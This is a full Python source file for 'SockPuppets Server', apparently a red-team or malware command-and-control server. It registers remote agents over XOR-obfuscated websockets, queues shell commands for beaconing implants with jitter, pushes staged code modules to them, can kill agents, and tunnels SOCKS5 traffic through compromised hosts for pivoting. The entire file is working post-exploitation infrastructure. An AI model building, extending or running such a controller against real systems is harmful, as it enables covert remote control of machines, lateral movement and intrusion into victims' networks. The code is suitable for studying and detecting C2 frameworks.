#!/usr/bin/env python3
"""
SockPuppets Server
Handles agent connections, command dispatch, and session management
"""

import asyncio
import websockets
import json
import uuid
import base64
import socket
import struct
import zlib
from pathlib import Path
from datetime import datetime
from typing import Dict, Set
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Suppress noisy websockets logs
logging.getLogger('websockets').setLevel(logging.WARNING)


class Agent:
    """Represents a connected agent"""
    def __init__(self, websocket, agent_id: str, metadata: dict):
        self.websocket = websocket
        self.agent_id = agent_id
        self.metadata = metadata
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.command_queue = asyncio.Queue()
        self.response_queue = asyncio.Queue()
        self.socks_proxy = None
        self.socks_data_queue = asyncio.Queue()
        self.mode = metadata.get('mode', 'streaming')  # 'beacon' or 'streaming'
        self.beacon_interval = metadata.get('beacon_interval', 60)
        self.beacon_jitter = metadata.get('beacon_jitter', 0)
        self.pending_results = []  # Store results from beacon checkins
        self.command_history = []  # Track commands sent
        self.command_sender_task = None  # Track send_commands task

    def get_info(self) -> dict:
        info = {
            'id': self.agent_id,
            'hostname': self.metadata.get('hostname', 'Unknown'),
            'username': self.metadata.get('username', 'Unknown'),
            'os': self.metadata.get('os', 'Unknown'),
            'ip': self.metadata.get('ip', 'Unknown'),
            'connected_at': self.connected_at.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
            'mode': self.mode,
            'beacon_interval': self.beacon_interval if self.mode == 'beacon' else 'N/A'
        }
        if self.mode == 'beacon' and self.beacon_jitter > 0:
            info['beacon_jitter'] = f"{self.beacon_jitter}%"
        return info


class SockPuppetsServer:
    """Main server class"""
    def __init__(self, host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
        self.host = host
        self.port = port
        self.encryption_key = encryption_key.encode() if isinstance(encryption_key, str) else encryption_key
        self.agents: Dict[str, Agent] = {}
        self.active_connections: Set[websockets.WebSocketServerProtocol] = set()
        self.streaming_module = self._load_streaming_module()

    def _load_streaming_module(self) -> str:
        """Load and compress streaming module"""
        try:
            module_path = Path(__file__).parent / 'templates' / 'streaming_module.py'
            with open(module_path, 'r') as f:
                module_code = f.read()

            # Compress the module
            compressed = zlib.compress(module_code.encode(), level=9)
            encoded = base64.b64encode(compressed).decode()

            logger.info(f"Loaded streaming module ({len(module_code)} bytes -> {len(compressed)} bytes compressed)")
            return encoded
        except Exception as e:
            logger.error(f"Failed to load streaming module: {e}")
            return ""

    def simple_encrypt(self, data: str) -> str:
        """XOR-based obfuscation"""
        key = self.encryption_key
        encoded = data.encode()
        encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
        return base64.b64encode(encrypted).decode()

    def simple_decrypt(self, data: str) -> str:
        """Decrypt XOR obfuscation"""
        key = self.encryption_key
        decoded = base64.b64decode(data.encode())
        decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
        return decrypted.decode()

    async def register_agent(self, websocket, message: dict) -> str:
        """Register a new agent connection"""
        agent_id = str(uuid.uuid4())[:8]
        metadata = message.get('metadata', {})
        metadata['ip'] = websocket.remote_address[0]

        agent = Agent(websocket, agent_id, metadata)
        self.agents[agent_id] = agent
        self.active_connections.add(websocket)

        logger.info(f"New agent registered: {agent_id} ({metadata.get('hostname', 'Unknown')})")
        return agent_id

    async def handle_agent(self, websocket, path=None):
        """Handle individual agent connection"""
        agent_id = None
        try:
            async for message in websocket:
                try:
                    # Decrypt and parse message
                    decrypted = self.simple_decrypt(message)
                    data = json.loads(decrypted)

                    msg_type = data.get('type')

                    if msg_type == 'register':
                        agent_id = await self.register_agent(websocket, data)
                        response = {
                            'type': 'registered',
                            'agent_id': agent_id,
                            'status': 'success'
                        }
                        encrypted_response = self.simple_encrypt(json.dumps(response))
                        await websocket.send(encrypted_response)

                        # Start command handler for this agent
                        agent = self.agents[agent_id]
                        agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                    elif msg_type == 'checkin':
                        # Beacon checking in with existing agent_id
                        agent_id = data.get('agent_id')
                        if agent_id and agent_id in self.agents:
                            # Update existing agent's connection
                            agent = self.agents[agent_id]
                            agent.websocket = websocket
                            agent.last_seen = datetime.now()
                            self.active_connections.add(websocket)

                            # Update metadata if provided
                            metadata = data.get('metadata', {})
                            if metadata:
                                agent.mode = metadata.get('mode', agent.mode)
                                agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                                agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)

                            # Silent checkin - don't spam logs
                            # logger.info(f"Agent {agent_id} checked in ({agent.metadata.get('hostname', 'Unknown')})")

                            # Restart command sender task if it died
                            if agent.command_sender_task is None or agent.command_sender_task.done():
                                logger.debug(f"Restarting command sender task for {agent_id}")
                                agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                            response = {
                                'type': 'checkin_ack',
                                'agent_id': agent_id,
                                'status': 'success'
                            }
                        else:
                            # Agent ID not found, treat as new registration
                            agent_id = await self.register_agent(websocket, data)
                            response = {
                                'type': 'registered',
                                'agent_id': agent_id,
                                'status': 'success'
                            }
                            agent = self.agents[agent_id]
                            agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))

                        encrypted_response = self.simple_encrypt(json.dumps(response))
                        await websocket.send(encrypted_response)

                    elif msg_type == 'heartbeat':
                        if agent_id and agent_id in self.agents:
                            self.agents[agent_id].last_seen = datetime.now()
                            response = {'type': 'heartbeat_ack', 'status': 'alive'}
                            encrypted_response = self.simple_encrypt(json.dumps(response))
                            await websocket.send(encrypted_response)

                    elif msg_type == 'response':
                        if agent_id and agent_id in self.agents:
                            agent = self.agents[agent_id]
                            output = data.get('output', '')
                            command = data.get('command', '')
                            timestamp = data.get('timestamp', '')

                            # Store result differently based on mode
                            if agent.mode == 'beacon':
                                # Beacon mode: store for later retrieval
                                agent.pending_results.append({
                                    'command': command,
                                    'output': output,
                                    'timestamp': timestamp,
                                    'received_at': datetime.now().isoformat()
                                })
                            else:
                                # Streaming mode: immediate response via queue only
                                try:
                                    agent.response_queue.put_nowait(output)
                                except asyncio.QueueFull:
                                    pass

                            agent.last_seen = datetime.now()
                            logger.debug(f"Result received from {agent_id}: {command[:50]}...")

                    elif msg_type == 'socks_data':
                        if agent_id and agent_id in self.agents:
                            await self.agents[agent_id].socks_data_queue.put(data.get('data', b''))
                            self.agents[agent_id].last_seen = datetime.now()

                    elif msg_type == 'mode_change':
                        if agent_id and agent_id in self.agents:
                            new_mode = data.get('mode', 'streaming')
                            self.agents[agent_id].mode = new_mode
                            self.agents[agent_id].last_seen = datetime.now()
                            logger.info(f"Agent {agent_id} switched to {new_mode} mode")

                except json.JSONDecodeError:
                    logger.error("Failed to decode message")
                except Exception as e:
                    logger.error(f"Error processing message: {e}")

        except websockets.exceptions.ConnectionClosed:
            pass  # Silent disconnect
        finally:
            if agent_id and agent_id in self.agents:
                self.active_connections.discard(websocket)
                # Don't remove agent immediately to preserve session info

    async def send_commands(self, agent_id: str):
        """Send queued commands to agent"""
        if agent_id not in self.agents:
            return

        agent = self.agents[agent_id]

        try:
            while True:
                command = await agent.command_queue.get()

                message = {
                    'type': 'command',
                    'command': command,
                    'timestamp': datetime.now().isoformat()
                }

                encrypted = self.simple_encrypt(json.dumps(message))

                # For beacon mode, retry sending if connection is closed
                max_retries = 30 if agent.mode == 'beacon' else 1
                for attempt in range(max_retries):
                    try:
                        if agent.websocket in self.active_connections:
                            await agent.websocket.send(encrypted)
                            logger.info(f"Command sent to {agent_id}: {command}")
                            break
                        else:
                            # Beacon is disconnected, wait for it to check in
                            if attempt < max_retries - 1:
                                await asyncio.sleep(1)
                            else:
                                logger.warning(f"Command timeout for {agent_id}, beacon didn't check in")
                    except websockets.exceptions.ConnectionClosed:
                        if attempt < max_retries - 1:
                            # Wait for beacon to reconnect
                            await asyncio.sleep(1)
                        else:
                            logger.warning(f"Failed to send command to {agent_id} after {max_retries} attempts")
                            break

        except Exception as e:
            logger.error(f"Error in send_commands for {agent_id}: {e}")

    async def send_command_to_agent(self, agent_id: str, command: str) -> str:
        """Queue command for agent and wait for response"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        # Track command
        agent.command_history.append({
            'command': command,
            'queued_at': datetime.now().isoformat()
        })

        # Queue the command
        await agent.command_queue.put(command)

        # For beacon mode, return immediately
        if agent.mode == 'beacon':
            return f"[*] Command queued for beacon (will execute on next checkin in ~{agent.beacon_interval}s)"

        # For streaming mode, wait for response
        if agent.websocket not in self.active_connections:
            return "Agent is not connected"

        try:
            response = await asyncio.wait_for(agent.response_queue.get(), timeout=30.0)
            return response
        except asyncio.TimeoutError:
            return "Command timeout - no response from agent"

    def get_agent_list(self) -> list:
        """Get list of all agents"""
        return [agent.get_info() for agent in self.agents.values()]

    def get_active_agents(self) -> list:
        """Get list of active agents"""
        active = []
        for agent in self.agents.values():
            if agent.websocket in self.active_connections:
                active.append(agent.get_info())
        return active

    def get_agent_results(self, agent_id: str, clear: bool = False) -> list:
        """Get pending results from agent"""
        if agent_id not in self.agents:
            return []

        agent = self.agents[agent_id]
        results = agent.pending_results.copy()

        if clear:
            agent.pending_results.clear()

        return results

    def check_agent_health(self, agent_id: str) -> str:
        """Check if beacon agent might be dead
        Returns warning message if agent is potentially dead, empty string otherwise
        """
        if agent_id not in self.agents:
            return ""

        agent = self.agents[agent_id]

        # Only check beacons
        if agent.mode != 'beacon':
            return ""

        # Calculate max expected time between checkins
        beacon_interval = agent.beacon_interval
        beacon_jitter_percent = agent.beacon_jitter

        # Max interval = base + jitter + 3 minute grace period
        jitter_seconds = beacon_interval * (beacon_jitter_percent / 100.0)
        max_expected_interval = beacon_interval + jitter_seconds + 180  # 3 minutes grace

        # Check time since last seen
        time_since_last_seen = (datetime.now() - agent.last_seen).total_seconds()

        if time_since_last_seen > max_expected_interval:
            minutes_overdue = int((time_since_last_seen - max_expected_interval) / 60)
            return f"Agent {agent_id} may be dead (last seen {int(time_since_last_seen/60)} minutes ago, expected checkin every {beacon_interval}s)"

        return ""

    async def set_beacon_interval(self, agent_id: str, interval: int) -> str:
        """Set beacon sleep interval for agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]
        agent.beacon_interval = interval

        message = {
            'type': 'set_interval',
            'interval': interval
        }
        encrypted = self.simple_encrypt(json.dumps(message))

        # For beacon mode, wait for agent to check in
        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    logger.info(f"Set beacon interval for {agent_id} to {interval}s")
                    return f"Beacon interval set to {interval} seconds"
                else:
                    # Beacon is disconnected, wait for it to check in
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        return f"Timeout - beacon didn't check in within {max_retries} seconds"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    return "Failed - connection closed"

        return "Failed to set beacon interval"

    async def upgrade_to_streaming(self, agent_id: str) -> str:
        """Upgrade agent from beacon to streaming mode (staged loading)"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.mode == 'streaming':
            return "Agent is already in streaming mode"

        if not self.streaming_module:
            return "Error: Streaming module not available"

        # Send upgrade command with streaming module
        message = {
            'type': 'upgrade_mode',
            'mode': 'streaming',
            'module_code': self.streaming_module
        }
        encrypted = self.simple_encrypt(json.dumps(message))

        # For beacon mode, wait for agent to check in
        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    agent.mode = 'streaming'
                    logger.info(f"Agent {agent_id} upgraded to streaming mode (staged module: {len(self.streaming_module)} bytes)")
                    return f"Agent upgraded to streaming mode (loaded {len(self.streaming_module)} byte module)"
                else:
                    # Beacon is disconnected, wait for it to check in
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        return f"Upgrade timeout - beacon didn't check in within {max_retries} seconds"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    return "Upgrade failed - connection closed"

        return "Upgrade failed"

    async def downgrade_to_beacon(self, agent_id: str, interval: int = 60) -> str:
        """Downgrade agent from streaming to beacon mode"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.mode == 'beacon':
            return "Agent is already in beacon mode"

        if agent.websocket not in self.active_connections:
            return "Agent not connected (cannot downgrade)"

        message = {
            'type': 'downgrade_mode',
            'mode': 'beacon',
            'interval': interval
        }
        encrypted = self.simple_encrypt(json.dumps(message))

        try:
            await agent.websocket.send(encrypted)
            agent.mode = 'beacon'
            agent.beacon_interval = interval
            logger.info(f"Agent {agent_id} downgraded to beacon mode ({interval}s)")
            return f"Agent downgraded to beacon mode ({interval}s interval)"
        except websockets.exceptions.ConnectionClosed:
            return "Downgrade failed - connection closed"

    async def kill_agent(self, agent_id: str) -> str:
        """Send kill command to terminate agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        message = {
            'type': 'kill',
            'command': 'terminate'
        }
        encrypted = self.simple_encrypt(json.dumps(message))

        # For beacon mode, wait for agent to check in
        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    logger.info(f"Kill command sent to {agent_id}")

                    # Remove agent from tracking
                    if agent.websocket in self.active_connections:
                        self.active_connections.discard(agent.websocket)
                    del self.agents[agent_id]

                    return f"Agent {agent_id} killed successfully"
                else:
                    # Beacon is disconnected, wait for it to check in
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        # Remove agent anyway after timeout
                        if agent_id in self.agents:
                            del self.agents[agent_id]
                        return f"Kill timeout - agent didn't check in (removed from tracking)"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    # Remove agent anyway
                    if agent_id in self.agents:
                        del self.agents[agent_id]
                    return f"Agent connection closed (removed from tracking)"

        return "Failed to kill agent"

    async def start_socks_proxy(self, agent_id: str, local_port: int) -> str:
        """Start SOCKS5 proxy through agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]
        if agent.websocket not in self.active_connections:
            return "Agent not connected"

        if agent.socks_proxy is not None:
            return f"SOCKS proxy already running on port {agent.socks_proxy}"

        try:
            # Start SOCKS server
            agent.socks_proxy = local_port
            asyncio.create_task(self._run_socks_server(agent_id, local_port))

            # Send command to agent to prepare for SOCKS
            message = {
                'type': 'socks_init',
                'port': local_port
            }
            encrypted = self.simple_encrypt(json.dumps(message))
            await agent.websocket.send(encrypted)

            logger.info(f"SOCKS proxy started for {agent_id} on port {local_port}")
            return f"SOCKS proxy started on 127.0.0.1:{local_port}"

        except Exception as e:
            agent.socks_proxy = None
            return f"Failed to start SOCKS proxy: {str(e)}"

    async def _run_socks_server(self, agent_id: str, port: int):
        """Run SOCKS5 server"""
        server = await asyncio.start_server(
            lambda r, w: self._handle_socks_client(agent_id, r, w),
            '127.0.0.1', port
        )
        logger.info(f"SOCKS server listening on 127.0.0.1:{port}")
        async with server:
            await server.serve_forever()

    async def _handle_socks_client(self, agent_id: str, reader, writer):
        """Handle SOCKS5 client connection"""
        try:
            agent = self.agents.get(agent_id)
            if not agent or agent.websocket not in self.active_connections:
                writer.close()
                await writer.wait_closed()
                return

            # SOCKS5 handshake
            data = await reader.read(262)
            if len(data) < 2 or data[0] != 0x05:
                writer.close()
                await writer.wait_closed()
                return

            # No authentication
            writer.write(b'\x05\x00')
            await writer.drain()

            # Get request
            data = await reader.read(4)
            if len(data) != 4:
                writer.close()
                await writer.wait_closed()
                return

            cmd, atyp = data[1], data[3]

            if atyp == 0x01:  # IPv4
                addr_data = await reader.read(6)
                addr = socket.inet_ntoa(addr_data[:4])
                port = struct.unpack('>H', addr_data[4:])[0]
            elif atyp == 0x03:  # Domain
                addr_len = (await reader.read(1))[0]
                addr_data = await reader.read(addr_len + 2)
                addr = addr_data[:addr_len].decode()
                port = struct.unpack('>H', addr_data[addr_len:])[0]
            elif atyp == 0x04:  # IPv6
                addr_data = await reader.read(18)
                addr = socket.inet_ntop(socket.AF_INET6, addr_data[:16])
                port = struct.unpack('>H', addr_data[16:])[0]
            else:
                writer.write(b'\x05\x08\x00\x01' + b'\x00' * 6)
                await writer.drain()
                writer.close()
                await writer.wait_closed()
                return

            # Send connection request to agent
            conn_msg = {
                'type': 'socks_connect',
                'host': addr,
                'port': port
            }
            encrypted = self.simple_encrypt(json.dumps(conn_msg))
            await agent.websocket.send(encrypted)

            # Send success response
            writer.write(b'\x05\x00\x00\x01' + b'\x00' * 6)
            await writer.drain()

            # Relay data
            await asyncio.gather(
                self._relay_socks_to_agent(agent, reader),
                self._relay_agent_to_socks(agent, writer)
            )

        except Exception as e:
            logger.error(f"SOCKS client error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()

    async def _relay_socks_to_agent(self, agent: Agent, reader):
        """Relay data from SOCKS client to agent"""
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break

                msg = {
                    'type': 'socks_send',
                    'data': base64.b64encode(data).decode()
                }
                encrypted = self.simple_encrypt(json.dumps(msg))
                await agent.websocket.send(encrypted)
        except Exception as e:
            logger.error(f"Relay to agent error: {e}")

    async def _relay_agent_to_socks(self, agent: Agent, writer):
        """Relay data from agent to SOCKS client"""
        try:
            while True:
                data = await agent.socks_data_queue.get()
                if isinstance(data, str):
                    data = base64.b64decode(data)
                writer.write(data)
                await writer.drain()
        except Exception as e:
            logger.error(f"Relay to SOCKS error: {e}")

    async def start(self):
        """Start the server"""
        logger.info(f"Starting SockPuppets Server on {self.host}:{self.port}")
        async with websockets.serve(self.handle_agent, self.host, self.port, max_size=10485760):
            logger.info("SockPuppets Server is running...")
            await asyncio.Future()  # Run forever


# Global server instance
server_instance = None

def get_server_instance():
    """Get or create server instance"""
    global server_instance
    if server_instance is None:
        server_instance = SockPuppetsServer()
    return server_instance


async def start_server(host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
    """Start the server"""
    global server_instance
    server_instance = SockPuppetsServer(host, port, encryption_key)
    await server_instance.start()


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='SockPuppets Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8443, help='Port to bind to')
    parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key')
    args = parser.parse_args()

    asyncio.run(start_server(args.host, args.port, args.key))
